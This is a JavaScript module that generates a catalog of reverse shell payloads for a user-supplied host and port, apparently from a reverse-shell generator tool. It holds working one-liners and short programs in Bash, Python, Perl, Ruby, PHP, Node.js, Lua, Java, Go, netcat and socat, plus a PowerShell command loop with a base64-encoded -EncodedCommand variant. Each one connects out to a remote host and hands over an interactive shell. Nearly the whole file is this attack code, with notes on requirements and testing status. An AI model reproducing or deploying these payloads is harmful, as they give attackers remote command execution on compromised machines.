import { buildSession, validateSettings } from './shell-builder.js?v=2';
const quote = text => "'" + text.replaceAll("'", "'\\''") + "'";
export function buildCatalog(input) {
 const {host,port}=validateSettings({...input,runtime:'bash',representation:'plain'});
 const core = runtime => buildSession({host,port,runtime,representation:'plain'});
 const bash=core('bash'),python=core('python');
 const powershell=`$client = [Net.Sockets.TcpClient]::new('${host}', ${port})
$stream = $client.GetStream()
$reader = [IO.StreamReader]::new($stream)
$writer = [IO.StreamWriter]::new($stream)
$writer.AutoFlush = $true
try {
  while (($line = $reader.ReadLine()) -ne $null) {
    if ($line -eq 'exit') { break }
    try { $result = Invoke-Expression $line 2>&1 | Out-String }
    catch { $result = $_ | Out-String }
    $writer.WriteLine($result)
  }
} finally { $client.Close() }`;
 const utf16 = btoa([...powershell].map(c=>String.fromCharCode(c.charCodeAt(0)&255,c.charCodeAt(0)>>8)).join(''));
 return [
  {id:'bash',name:'Bash',platform:'POSIX',command:bash.payload,notes:bash.requirements,encoded:buildSession({...bash.settings,representation:'base64'}).payload,tested:true},
  {id:'python',name:'Python 3',platform:'POSIX',command:python.payload,notes:python.requirements,encoded:buildSession({...python.settings,representation:'base64'}).payload,tested:true},
  {id:'perl',name:'Perl',platform:'POSIX',command:`perl -MIO::Socket::INET -e ${quote(`my $c=IO::Socket::INET->new(PeerAddr=>"${host}",PeerPort=>${port},Proto=>"tcp") or die $!; open(STDIN,"<&",$c) or die $!; open(STDOUT,">&",$c) or die $!; open(STDERR,">&",$c) or die $!; exec("/bin/sh","-i");`)}`,notes:'Perl with IO::Socket::INET and /bin/sh. Plain stream; no PTY.',tested:true},
  {id:'ruby',name:'Ruby',platform:'POSIX',command:`ruby -rsocket -e ${quote(`s=TCPSocket.new("${host}",${port}); exec("/bin/sh","-i",in:s,out:s,err:s)`)}`,notes:'Ruby with its socket library. Explicit IO mapping avoids assuming socket descriptor 3.',tested:false},
  {id:'php',name:'PHP CLI',platform:'POSIX',command:`php -r ${quote(`$s=stream_socket_client("tcp://${host}:${port}"); if($s===false){exit(1);} $p=proc_open(["/bin/sh","-i"],[0=>$s,1=>$s,2=>$s],$pipes); if(is_resource($p)){proc_close($p);} fclose($s);`)}`,notes:'PHP 7.4+ CLI with proc_open enabled; POSIX. Uses the actual socket resource rather than a guessed descriptor.',tested:false},
  {id:'node',name:'Node.js',platform:'POSIX',command:`node -e ${quote(`const net=require("node:net"),{spawn}=require("node:child_process");const c=net.createConnection({host:"${host}",port:${port}},()=>{const p=spawn("/bin/sh",["-i"]);c.pipe(p.stdin);p.stdout.pipe(c,{end:false});p.stderr.pipe(c,{end:false});p.on("close",()=>c.end(()=>c.destroy()));p.on("error",()=>c.destroy());c.on("close",()=>p.kill());});c.on("error",()=>process.exit(1));`)}`,notes:'Node.js built-in modules only. Streams shell output over TCP; does not allocate a terminal.',tested:true},
  {id:'powershell',name:'PowerShell',platform:'Windows',command:powershell,notes:'Paste in PowerShell. Line-oriented command loop, not a full console/PTY. Send exit to disconnect. Encoded alternative uses UTF-16LE, with the same visible script.',encoded:`powershell.exe -NoProfile -EncodedCommand ${utf16}`,tested:false},
  {id:'lua',name:'Lua',platform:'POSIX',command:`lua -e ${quote(`local socket=require("socket");local c=assert(socket.tcp());assert(c:connect("${host}",${port}));while true do local line=c:receive("*l");if not line or line=="exit" then break end;local p=io.popen(line.." 2>&1");if p then c:send(p:read("*a"));p:close() end end;c:close()`)}`,notes:'Requires LuaSocket and io.popen. Executes one line at a time in a new process; cd does not persist. Not a PTY.',tested:false},
  {id:'java',name:'Java',platform:'POSIX',command:`import java.net.Socket;
class LabShell {
  public static void main(String[] args) throws Exception {
    try (Socket s = new Socket("${host}", ${port})) {
      Process p = new ProcessBuilder("/bin/sh", "-i").redirectErrorStream(true).start();
      Thread input = new Thread(() -> {
        try {
          byte[] buffer = new byte[4096];
          int n;
          while ((n = s.getInputStream().read(buffer)) != -1) {
            p.getOutputStream().write(buffer, 0, n);
            p.getOutputStream().flush();
          }
          p.getOutputStream().close();
        }
        catch (Exception ignored) { p.destroy(); }
      });
      input.setDaemon(true);
      input.start();
      p.getInputStream().transferTo(s.getOutputStream());
      p.waitFor();
    }
  }
}`,notes:'Save as LabShell.java; run java LabShell.java with a JDK 11+ source-file launcher. POSIX shell required; no PTY.',tested:true},
  {id:'go',name:'Go',platform:'POSIX',command:`package main
import ("net"; "os/exec"; "log")
func main() {
  c, err := net.Dial("tcp", "${host}:${port}")
  if err != nil { log.Fatal(err) }
  defer c.Close()
  f, err := c.(*net.TCPConn).File()
  if err != nil { log.Fatal(err) }
  defer f.Close()
  cmd := exec.Command("/bin/sh", "-i")
  cmd.Stdin, cmd.Stdout, cmd.Stderr = f, f, f
  if err := cmd.Run(); err != nil { log.Print(err) }
}`,notes:'Save as shell.go; run go run shell.go. POSIX socket-descriptor inheritance; no PTY.',tested:true},
  {id:'netcat',name:'Netcat (-e)',platform:'POSIX',command:`nc ${host} ${port} -e /bin/sh`,notes:'Only nc builds that implement -e. OpenBSD nc generally does not; check nc -h. Ncat has different syntax.',tested:true},
  {id:'socat',name:'Socat / PTY',platform:'POSIX',command:`socat TCP:${host}:${port} EXEC:'/bin/sh -i',pty,stderr,setsid,sigint,sane`,notes:'Requires socat on the target. Allocates a target PTY; still set local terminal mode and size if using an nc listener.',tested:true}
 ];
}
